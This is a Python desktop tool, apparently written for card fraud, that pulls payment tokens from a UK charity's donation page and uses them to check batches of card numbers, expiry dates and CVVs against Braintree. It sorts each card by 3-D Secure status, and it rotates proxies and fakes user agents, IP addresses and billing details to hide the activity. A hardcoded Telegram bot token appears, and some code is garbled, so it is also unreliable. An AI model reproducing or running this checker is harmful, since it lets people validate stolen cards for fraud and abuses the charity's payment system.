import sys
import requests
import json
import re
import base64
import random
import time
import threading
import hashlib
import os
from datetime import datetime
from PyQt5.QtWidgets import *
from PyQt5.QtCore import *
from PyQt5.QtGui import *
from faker import Faker
from urllib.parse import urlparse
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# ============================================================
# HIGH DPI FIX
# ============================================================
try:
    from ctypes import windll
    windll.shcore.SetProcessDpiAwareness(1)
except:
    pass

QApplication.setAttribute(Qt.AA_EnableHighDpiScaling, True)
QApplication.setAttribute(Qt.AA_UseHighDpiPixmaps, True)

fake = Faker()
# ============================================================
# ENCRYPTION CLASS
# ============================================================
BOT_TOKEN = "8946982094:AAFzX_iUPUwftGC7dV21xo179JT6nV1mW20"
class CryptoManager:
    """AES-256 Encryption for data protection"""
    
    SALT = b'braintree_salt_2024'
    KEY_LENGTH = 32  # AES-256
    
    
    def derive_key(password):
        """Derive AES key from password"""
        return hashlib.pbkdf2_hmac(
            'sha256',
            password.encode('utf-8'),
            CryptoManager.SALT,
                        100000,
            dklen=CryptoManager.KEY_LENGTH
        """Encrypt data with password"""
            key = CryptoManager.derive_key(password)
            cipher = AES.new(key, AES.MODE_CBC)
            ct_bytes = cipher.encrypt(pad(data.encode('utf-8'), AES.block_size))
            iv = base64.b64encode(cipher.iv).decode('utf-8')
            ct = base64.b64encode(ct_bytes).decode('utf-8')
            return f"{iv}:{ct}"
        except Exception as e:
            return None
    
    
    def decrypt(encrypted_data, password):
        """Decrypt data with password"""
        try:
            iv, ct = encrypted_data.split(':')
            iv = base64.b64decode(iv)
            ct = base64.b64decode(ct)
            key = CryptoManager.derive_key(password)
            cipher = AES.new(key, AES.MODE_CBC, iv=iv)
            pt = unpad(cipher.decrypt(ct), AES.block_size)
            return pt.decode('utf-8')
        except Exception as e:
            return None

# ============================================================
# PASSWORD DIALOG
# ============================================================
class PasswordDialog(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle("🔐 Authentication Required")
        self.setFixedSize(350, 180)
        self.setStyleSheet("""
            QDialog {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:1,
                    stop:0 #0d0d1a, stop:1 #1a0a2a);
                background-color: #141428;
                color: #00ffaa;
                border: 1px solid #1a3a5a;
                border-radius: 6px;
                font-family: 'Consolas';
                font-size: 11pt;
            }
            QLineEdit:focus { border: 1px solid #8a44ff; }
            QPushButton {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                    stop:0 #4a2a7a, stop:1 #2a1a4a);
                color: #e0e0e0;
                border: none;
                border-radius: 6px;
                padding: 8px 20px;
                font-family: 'Segoe UI';
                font-size: 11pt;
                font-weight: bold;
            }
            QPushButton:hover {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                    stop:0 #6a3a9a, stop:1 #3a2a5a);
            }
            QPushButton#unlockBtn {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                    stop:0 #00cc66, stop:1 #008844);
                color: #000;
            }
            QPushButton#unlockBtn:hover {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                    stop:0 #00ee88, stop:1 #00aa55);
            }
        """)
        
        self.setup_ui()
        self.password = ""
        self.accepted = False
        
    def setup_ui(self):
        layout = QVBoxLayout(self)
        layout.setSpacing(10)
        layout.setContentsMargins(20, 20, 20, 20)
        
        # Icon + Title
        title_layout = QHBoxLayout()
        icon = QLabel("🔐")
        icon.setStyleSheet("font-size: 24pt;")
        title_layout.addWidget(icon)
        
        title = QLabel("Enter Password")
        title.setStyleSheet("color: #8a44ff; font-size: 16pt; font-weight: bold;")
        title_layout.addWidget(title)
        title_layout.addStretch()
        layout.addLayout(title_layout)
        
        # Subtitle
        sub = QLabel("This tool is password protected")
        sub.setStyleSheet("color: #666; font-size: 9pt;")
        layout.addWidget(sub)
        
        layout.addSpacing(5)
        
        # Password input
        self.pass_input = QLineEdit()
        self.pass_input.setEchoMode(QLineEdit.Password)
        self.pass_input.setPlaceholderText("Enter master password...")
        self.pass_input.returnPressed.connect(self.unlock)
        layout.addWidget(self.pass_input)
        
        # Error message
        self.error_label = QLabel("")
        self.error_label.setStyleSheet("color: #ff4444; font-size: 9pt;")
        layout.addWidget(self.error_label)
        
        # Buttons
        btn_layout = QHBoxLayout()
        
        self.unlock_btn = QPushButton("🔓 UNLOCK")
        self.unlock_btn.setObjectName("unlockBtn")
        self.unlock_btn.clicked.connect(self.unlock)
        
        self.quit_btn = QPushButton("✕ QUIT")
        self.quit_btn.clicked.connect(self.reject)
        
        btn_layout.addWidget(self.unlock_btn)
        btn_layout.addWidget(self.quit_btn)
        layout.addLayout(btn_layout)
        
    def unlock(self):
        password = self.pass_input.text()
        if password:
            self.password = password
            self.accepted = True
            self.accept()
        else:
            self.error_label.setText("❌ Please enter a password")
    
    def get_password(self):
        return self.password if self.accepted else None

# ============================================================
# CONFIGURATION
# ============================================================
SITE_URL = "https://cllsupport.org.uk"
DONATE_URL = f"{SITE_URL}/donate/"
BRAINTREE_GRAPHQL = "https://payments.braintree-api.com/graphql"
BRAINTREE_API = "https://api.braintreegateway.com"

HEADERS = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-GB,en;q=0.9",
    "Cache-Control": "no-cache",
    "Pragma": "no-cache",
}

STATUS_MAP = {
    "authenticate_successful": "Passed",
    "authenticate_attempt_successful": "Passed",
    "challenge_required": "OTP Required",
    "authenticate_frictionless_failed": "OTP Required",
    "lookup_card_error": "OTP Required",
    "authenticate_rejected": "OTP Required",
    "lookup_error": "Error",
    "authenticate_unavailable": "OTP Required",
    "authenticate_error": "Error",
    "no_response": "Failed",
}

# ============================================================
# PROXY MANAGER
# ============================================================
class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.current_index = 0
        self.lock = threading.Lock()
        
    def load_from_text(self, text):
        self.proxies = []
        for line in text.strip().split('\n'):
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            proxy = self.parse_proxy(line)
            if proxy:
                self.proxies.append(proxy)
        return len(self.proxies)
    
    def parse_proxy(self, proxy_str):
        if '://' in proxy_str:
            parsed = urlparse(proxy_str)
            protocol = parsed.scheme
            host = parsed.hostname
            port = parsed.port
            username = parsed.username
            password = parsed.password
        else:
            parts = proxy_str.split(':')
            if len(parts) >= 2:
                host = parts[0]
                port = int(parts[1])
                protocol = 'http'
                username = None
                password = None
            else:
                return None
        
        if not host or not port:
            return None
        
        proxy_url = f'{protocol}://'
        if username and password:
            proxy_url += f'{username}:{password}@'
        proxy_url += f'{host}:{port}'
        
        return {
            'http': proxy_url,
            'https': proxy_url
        }
    
    def get_next(self):
        with self.lock:
            if not self.proxies:
                return None
            proxy = self.proxies[self.current_index]
            self.current_index = (self.current_index + 1) % len(self.proxies)
            return proxy
    
    def get_random(self):
        with self.lock:
            if not self.proxies:
                return None
            return random.choice(self.proxies)
    
    def get_by_index(self, index):
        with self.lock:
            if not self.proxies or index >= len(self.proxies):
                return None
            return self.proxies[index]
    
    def count(self):
        return len(self.proxies)
    
    def get_all(self):
        return self.proxies.copy()

# ============================================================
# CORE ENGINE
# ============================================================
class BraintreeEngine: 
    def detect_brand(cc):
        if cc.startswith("4"): return "VISA"
        if cc.startswith("5"): return "MASTERCARD"
        if cc.startswith("3"): return "AMEX"
        if cc.startswith("6"): return "DISCOVER"
        return "UNKNOWN"

    
    def get_session(proxy=None):
        session = requests.Session()
        session.headers.update(HEADERS)
        session.headers.update({"User-Agent": fake.user_agent()})
        session.cookies.set("cookie_test", "please_accept_for_session")
        session.cookies.set("civicAllowCookies", "yes")
        if proxy:
            session.proxies.update(proxy)
        return session

  
    def extract_auth(session):
        for attempt in range(5):
            try:
                r = session.get(DONATE_URL, timeout=20)
                m = re.search(r'name="clientToken"\s+value="([^"]+)"', r.text)
                if not m:
                    m = re.search(r'var\s+wc_braintree_client_token\s*=\s*\["(.*?)"\]', r.text)
                if not m:
                    auth_m = re.search(r'"authorizationFingerprint"\s*:\s*"([^"]+)"', r.text)
                    merch_m = re.search(r'"merchantId"\s*:\s*"([^"]+)"', r.text)
                    if auth_m:
                        auth = auth_m.group(1)
                        merch = merch_m.group(1) if merch_m else "dyb5fmjx5t5wxckj"
                        return auth, merch
                if m:
                    decoded = base64.b64decode(m.group(1)).decode("utf-8")
                    data = json.loads(decoded)
                    auth = data.get("authorizationFingerprint", "")
                    merch = data.get("merchantId", "")
                    if auth and merch:
                        return auth, merch
            except Exception:
                pass
            time.sleep(2)
        return None, None

    
    def tokenize_card(session, auth, card_data):
        month, year = card_data["expiry"].split("/")
        if len(year) == 2:
            year = "20" + year
        query = """mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
            tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 } }
        }"""
        variables = {
            "input": {
                "creditCard": {
                    "number": card_data["number"],
                    "expirationMonth": month,
                    "expirationYear": year,
                    "cvv": card_data["cvv"]
                },
                "options": {"validate": False}
            }
        }
        h = {
            **HEADERS,
            "Authorization": f"Bearer {auth}",
            "Braintree-Version": "2018-05-10",
            "Content-Type": "application/json",
            "User-Agent": fake.user_agent()
        }
        body = {
            "clientSdkMetadata": {
                "source": "client",
                "integration": "custom",
                "sessionId": str(fake.uuid4())
            },
            "query": query,
            "variables": variables,
            "operationName": "TokenizeCreditCard"
        }
        resp = session.post(BRAINTREE_GRAPHQL, headers=h, json=body)
        data = resp.json()
        if "errors" in data:
            return None, None, None
        token = data["data"]["tokenizeCreditCard"]["token"]
        cc = data["data"]["tokenizeCreditCard"]["creditCard"]
        return token, cc.get("last4", ""), cc.get("brandCode", "VISA")

    @staticmethod
    def lookup_3ds(session, auth, merch, token, card_data):
        url = f"{BRAINTREE_API}/merchants/{merch}/client_api/v1/payment_methods/{token}/three_d_secure/lookup"
        payload = {
            "amount": "1.00",
            "browserColorDepth": 24,
            "browserJavaEnabled": False,
            "browserJavascriptEnabled": True,
            "browserLanguage": "en-GB",
            "browserScreenHeight": 800,
            "browserScreenWidth": 360,
            "browserTimeZone": -345,
            "deviceChannel": "Browser",
            "additionalInfo": {
                "ipAddress": fake.ipv4(),
                "billingLine1": "New York",
                "billingCity": "New York",
                "billingState": "NY",
                "billingPostalCode": "10080",
                "billingCountryCode": "US",
                "billingPhoneNumber": "998773772",
                "billingGivenName": "diwas",
                "billingSurname": "Py",
                "email": "diwasPy@gmail.com"
            },
            "bin": card_data["number"][:6],
            "dfReferenceId": f"0_{fake.uuid4()}",
            "clientMetadata": {
                "requestedThreeDSecureVersion": "2",
                "sdkVersion": "web/3.115.1",
                "cardinalDeviceDataCollectionTimeElapsed": random.randint(400, 2000),
                "issuerDeviceDataCollectionTimeElapsed": random.randint(800, 5000),
                "issuerDeviceDataCollectionResult": True
            },
            "authorizationFingerprint": auth,
            "braintreeLibraryVersion": "braintree/web/3.115.1",
            "_meta": {
                "merchantAppId": "cllsupport.org.uk",
                "platform": "web",
                "sdkVersion": "3.115.1",
                "source": "client",
                "integration": "custom",
                "integrationType": "custom",
                "sessionId": str(fake.uuid4())
            },
        }
        resp = session.post(url, headers={**HEADERS, "Content-Type": "application/json", "User-Agent": fake.user_agent()}, json=payload, timeout=45)
        if resp.status_code in [200, 201] and resp.text.strip():
            return resp.json()
        return {}

    
    def parse_status(lookup):
        try:
            return lookup["paymentMethod"]["threeDSecureInfo"]["status"]
        except:
            lookup_str = json.dumps(lookup)
            for code in STATUS_MAP:
                if code in lookup_str:
                    return code
        return "no_response"

    
    def get_enrolled_info(lookup, result_code):
        enrolled_raw = None
        try:
            enrolled_raw = lookup["paymentMethod"]["threeDSecureInfo"]["enrolled"]
        except:
            pass
        if enrolled_raw == "Y":
            return "ENROLLED", "Y"
        elif enrolled_raw == "N":
            return "NOT_ENROLLED", "N"
        elif enrolled_raw == "U":
            return "UNKNOWN", "U"
        enrolled_map = {
            "authenticate_successful": "ENROLLED",
            "authenticate_attempt_successful": "ENROLLED",
            "challenge_required": "ENROLLED",
            "authenticate_frictionless_failed": "ENROLLED",
            "lookup_card_error": "NOT_ENROLLED",
            "authenticate_rejected": "NOT_ENROLLED",
            "lookup_error": "NOT_ENROLLED",
            "authenticate_unavailable": "NOT_ENROLLED",
            "authenticate_error": "NOT_ENROLLED",
            "no_response": "UNKNOWN"
        }
        return enrolled_map.get(result_code, "UNKNOWN"), enrolled_raw or "-"

    
    def check_card(card_data, callback, index=0, total=1, proxy=None):
        result = None
        try:
            card_num = card_data["number"].replace(" ", "").replace("-", "")
            card_data["number"] = card_num
            brand = BraintreeEngine.detect_brand(card_num)
            t0 = time.time()
            
            session = BraintreeEngine.get_session(proxy)
            
            callback("progress", f"[{index+1}/{total}] Auth...", index)
            auth, merch = BraintreeEngine.extract_auth(session)
            if not auth:
                callback("progress", f"[{index+1}/{total}] Auth failed", index)
                return None
            
            callback("progress", f"[{index+1}/{total}] Tokenizing...", index)
            token, last4, brand_code = BraintreeEngine.tokenize_card(session, auth, card_data)
            if not token:
                callback("progress", f"[{index+1}/{total}] Token failed", index)
                return None
            
            brand = brand_code or brand
            callback("progress", f"[{index+1}/{total}] 3DS lookup...", index)
            lookup = BraintreeEngine.lookup_3ds(session, auth, merch, token, card_data)
            result_code = BraintreeEngine.parse_status(lookup)
            status = STATUS_MAP.get(result_code, "Unknown")
            enrolled_status, enrolled_flag = BraintreeEngine.get_enrolled_info(lookup, result_code)
            elapsed = time.time() - t0
            
            result = {
                "card": card_num,
                "full_card": card_num,
                "expiry": card_data["expiry"],
                "cvv": card_data["cvv"],
                "brand": brand,
                "last4": last4 or card_num[-4:],
                "status": status,
                "enrolled": enrolled_status,
                "enrolled_flag": enrolled_flag,
                "code": result_code,
                "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "elapsed": f"{elapsed:.2f}s"
            }
            callback("result", result, index)
            return result
        except Exception as e:
            callback("progress", f"[{index+1}/{total}] Error: {str(e)[:50]}", index)
            return None

# ============================================================
# COMBO WORKER
# ============================================================
class ComboWorker(QThread):
    progress_signal = pyqtSignal(str, object, int)
    finished_signal = pyqtSignal(list)
    
    def __init__(self, cards, proxy_manager, rotation_mode='random'):
        super().__init__()
        self.cards = cards
        self.total_cards = len(cards)
        self.proxy_manager = proxy_manager
        self.rotation_mode = rotation_mode
        self.results = []
        self.running = True
        
    def stop(self):
        self.running = False
        
    